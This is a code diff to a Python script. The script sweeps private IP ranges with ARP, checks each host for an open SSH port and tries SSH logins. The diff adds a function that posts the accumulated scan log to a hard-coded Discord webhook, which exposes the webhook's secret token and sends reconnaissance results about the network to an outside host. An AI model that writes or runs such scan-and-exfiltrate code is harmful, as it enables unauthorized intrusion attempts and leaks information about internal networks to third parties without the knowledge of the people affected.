@@ -2,6 +2,8 @@ from scapy.all import ARP, Ether, srp
 import paramiko
 import socket
 import ipaddress
+import json
+import requests
 
 def generate_private_ips():
     private_ips = []
@@ -12,6 +14,16 @@ def generate_private_ips():
         private_ips.append(str(ip))
 
     return private_ips
+
+def send_to_discord(content):
+    webhook_url = "https://discord.com/api/webhooks/1297527399268876288/DcPDYJNPM6mvV8iQ879HfBo5r8B1qdpIAy2AlZAUwCzgSvKD1XHldCWHjP5YuEYKQgWO" 
+    headers = {
+        "Content-Type": "application/json"
+    } 
+    data = {
+        "content": content
+    }
+    requests.post(webhook_url, json=data, headers=headers)
 
 def scan_network(ip):
     print(ip)
@@ -45,6 +57,7 @@ def ssh_connect(ip):
 if __name__ == "__main__":
     all_private_ips = generate_private_ips()
     all_devices = []
+    log_lines = ""
 
     print("활성 장비 스캔 중...")
     for ip in all_private_ips:
@@ -56,7 +69,11 @@ if __name__ == "__main__":
         print(f"IP: {device['ip']}, MAC: {device['mac']}")
         
         if check_ssh(device['ip']):
-            print(f"SSH 포트가 열려있습니다: {device['ip']}. SSH 접속 시도 중...")
-            ssh_connect(device['ip'], username='your_username', password='your_password')
+            ssh_status = f"SSH 포트가 열려있습니다: {device['ip']}. SSH 접속 시도 중..."
+            log_lines += "\n" + ssh_status
+            ssh_connect(device['ip'])
         else:
-            print(f"SSH 포트가 닫혀있습니다: {device['ip']}")
+            ssh_status = f"SSH 포트가 닫혀있습니다: {device['ip']}"
+            log_lines += "\n" + ssh_status
+    
+    send_to_discord(log_lines)
